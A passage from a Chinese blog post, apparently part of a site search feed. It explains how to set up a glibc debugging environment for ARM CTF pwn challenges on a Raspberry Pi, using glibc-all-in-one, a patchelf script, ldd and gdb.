alt="完成后的效果"></p><p>类似上图，然后删除debs和libc里的文件，这些都是x86下的，用不到的.</p><h1 id="如何更改libc并完成调试"><a href="#如何更改libc并完成调试" class="headerlink" title="如何更改libc并完成调试"></a>如何更改libc并完成调试</h1><h2 id="下载libc"><a href="#下载libc" class="headerlink" title="下载libc"></a>下载libc</h2><p>当什么的工作都完成了我们就可以开始调试啦，我们以一道题目为例</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717130021816.png" alt="例子"></p><p>一般附件会给我们四个文件，这里我们需要的只要libc-2.31.so和题目文件</p><p>先将libc放入我们的树莓派系统中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x libc-2.31.so</span><br><span class="line">./libc-2.31.so</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132511485.png" alt="查看libc版本"></p><p>这样我们就能找到对应的libc版本</p><p>在这个网站中我们可以找到不同架构的不同版本libc，只要<strong>更改最后的路径</strong>即可,需要什么版本搜索什么</p><p><a href="https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2">https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.2</a></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717132941579.png" alt="寻找libc"></p><p>点击上图的arm64</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133112289.png" alt="需要下载的包">下载如图所示的文件(其他版本也是这样格式)到这里*/home/<strong>yourneme</strong>/glibc-all-in-one/debs<em>，注意<strong>yourname</strong>是你主机的名字，可以直接<strong>拖动</strong>到Finallshell显示的该文件夹下，或者*<em>复制</em></em></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717133330375.png" alt="下载路径"></p><p>路径如图</p><p>在glibc目录下运行下面命令（<strong>注意更改路径，将ubuntu换成你的名字</strong>）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64</span><br><span class="line">./extract /home/ubuntu/glibc-all-in-one/debs/libc6-dbg_2.31-0ubuntu9.2_arm64.deb /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64/.debug</span><br></pre></td></tr></table></figure><p>这样libc就部署好了。</p><h2 id="使用patchelf改变ld和libc"><a href="#使用patchelf改变ld和libc" class="headerlink" title="使用patchelf改变ld和libc"></a>使用patchelf改变ld和libc</h2><p>这里提供一个脚本来帮助师傅们更改libc，脚本来源：<em><a href="https://bbs.pediy.com/thread-254868.htm">https://bbs.pediy.com/thread-254868.htm</a></em></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -x</span><br><span class="line">libc_path=<span class="variable">$1</span></span><br><span class="line">elf_path=<span class="variable">$2</span></span><br><span class="line">patchelf_bin_path=<span class="string">&quot;/home/ubuntu/patchelf/src/patchelf&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$&#123;libc_path&#125;</span>/ld-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --set-interpreter <span class="variable">$libc_path</span>/ld-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$patchelf_bin_path</span> --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br></pre></td></tr></table></figure><p>这里的*patchelf_bin_path=”/home/ubuntu/patchelf/src/patchelf”*路径需要师傅们自行更改为自己patchelf的路径，<strong>注意不是文件夹是文件夹里的文件</strong>。</p><p>将该脚本命名为chlibc.sh</p><p>添加可执行权限</p><p>使用该脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chlibc.sh /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64 channel </span><br></pre></td></tr></table></figure><p>第二个路径是你<strong>libc文件夹</strong>的位置，最后是你文件的位置，这样就实现了对文件的patch，改变了文件的ld和libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134856774.png" alt="patch"></p><p>使用ldd验证一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134809674.png" alt="验证"></p><p>可以发现没有任何问题</p><h2 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h2><p>我们用gdb调试一下看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134953976.png" alt="heap可行"></p><p>这样完成调试，显示heap</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717135015786.png" alt="bins可行"></p><p>也可以正常显示bins，这样就完成了我们的环境搭建了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我的第一篇博客啦，有写的有问题的地方还望各位师傅斧正。上面的操作基本可以实现在arm架构下的脚本写exp并调试，如果觉得自带的vim不够方便的话还可以使用远程编辑exp，这个会在日后更新的。这里是本人的一点拙见，希望我写的东西能对你有一丝丝的帮助，感谢每个观看该文章的师傅。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Armpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Arm </tag>
            
            <tag> Iot </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
